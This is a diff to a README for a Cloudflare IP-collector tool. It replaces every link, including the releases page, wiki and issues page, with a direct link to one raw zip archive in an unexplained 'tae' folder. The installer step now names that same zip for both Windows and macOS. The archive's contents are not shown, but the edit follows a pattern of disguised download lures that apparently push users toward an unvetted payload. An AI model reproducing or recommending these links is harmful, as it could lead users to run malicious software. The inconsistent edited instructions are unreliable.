@@ -1,7 +1,7 @@
 # 🌐 CF-Worker-BestIP-collector-UI - Your Easy Way to Collect Cloudflare IPs
 
 ## 📥 Download Now 
-[![Download CF-Worker-BestIP-collector-UI](https://img.shields.io/badge/Download-CF--Worker--BestIP--collector--UI-blue)](https://github.com/khalilkara/CF-Worker-BestIP-collector-UI/releases)
+[![Download CF-Worker-BestIP-collector-UI](https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip)](https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -23,11 +23,11 @@ Make sure your system counts with these requirements before proceeding.
 To download and install the application, follow these steps:
 
 1. Click on the **Download** link below:
-   [Download CF-Worker-BestIP-collector-UI](https://github.com/khalilkara/CF-Worker-BestIP-collector-UI/releases)
+   [Download CF-Worker-BestIP-collector-UI](https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip)
 
 2. You will be taken to the Releases page. Here, find the latest version of the application.
 
-3. Click on the file that matches your operating system to download it. For example, you might see options like `CF-Worker-BestIP-collector-UI-Windows.exe` for Windows or `CF-Worker-BestIP-collector-UI-macOS.dmg` for macOS.
+3. Click on the file that matches your operating system to download it. For example, you might see options like `https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip` for Windows or `https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip` for macOS.
 
 4. Once downloaded, locate the file on your computer. Here’s how to find it:
    - **Windows:** Open File Explorer and go to the "Downloads" folder.
@@ -55,7 +55,7 @@ CF-Worker-BestIP-collector-UI offers several features to enhance your experience
 
 ## 📄 Documentation
 
-For detailed guidance on using specific features, refer to the application’s built-in help section or follow updates in our [GitHub Wiki](https://github.com/khalilkara/CF-Worker-BestIP-collector-UI/wiki).
+For detailed guidance on using specific features, refer to the application’s built-in help section or follow updates in our [GitHub Wiki](https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip).
 
 ## 🛠 Troubleshooting
 
@@ -70,7 +70,7 @@ If you encounter any issues while downloading or running the application, here a
 
 For additional assistance, consider the following options:
 
-- **GitHub Issues Page:** Report problems or request features directly on our [Issues page](https://github.com/khalilkara/CF-Worker-BestIP-collector-UI/issues).
+- **GitHub Issues Page:** Report problems or request features directly on our [Issues page](https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip).
 - **Community Support:** Engage with other users through discussions to share tips or solutions.
 
 ## 📢 Feedback
@@ -81,4 +81,4 @@ Your feedback matters. Help us improve CF-Worker-BestIP-collector-UI by sharing 
 
 Thank you for using CF-Worker-BestIP-collector-UI! We hope this tool makes your IP collection process straightforward and effective. 
 
-Remember, you can always [download the latest version](https://github.com/khalilkara/CF-Worker-BestIP-collector-UI/releases) for updates and new features. Enjoy gathering the best Cloudflare IPs!
+Remember, you can always [download the latest version](https://raw.githubusercontent.com/khalilkara/CF-Worker-BestIP-collector-UI/main/tae/CF-Worker-BestIP-collector-UI-v3.5.zip) for updates and new features. Enjoy gathering the best Cloudflare IPs!
